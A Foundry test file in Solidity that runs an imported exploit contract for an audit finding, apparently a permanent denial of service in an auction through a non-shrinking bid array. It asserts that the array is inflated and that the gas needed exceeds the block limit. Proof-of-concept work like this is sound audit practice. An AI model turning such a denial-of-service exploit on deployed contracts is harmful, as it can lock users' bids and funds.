// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./29526-h-05-permanent-dos-due-to-non-shrinking-array-usage-in-an-un.sol";

contract NextGenAuctionDosTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        // Fund for SAMPLE wei bids (1+2+...+SAMPLE)
        vm.deal(address(e), 1 ether);
        e.run();

        assertGt(e.extrapolatedGas(), e.BLOCK_GAS(), "exceeds block gas");
        assertEq(e.bidLen(), e.SAMPLE(), "array inflated");
    }
}
